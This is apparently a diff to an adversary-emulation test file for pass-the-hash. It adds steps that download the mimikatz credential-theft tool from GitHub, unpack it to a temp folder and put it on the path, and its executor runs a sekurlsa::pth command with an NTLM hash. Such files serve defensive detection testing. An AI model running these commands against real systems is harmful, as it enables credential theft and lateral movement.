@@ -21,6 +21,15 @@ atomic_tests:
       description: domain
       type: string
       default: atomic.local
+  dependencies:
+    description: |
+      Mimikatz executor must exist on disk and be accessible via the Path variable
+    prereq_command: |
+      if (Get-Command mimikatz -ErrorAction SilentlyContinue) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+      $env:Path += ";" + $env:Temp+"\mimikatz\Win32\"
   executor:
     command: |
       mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
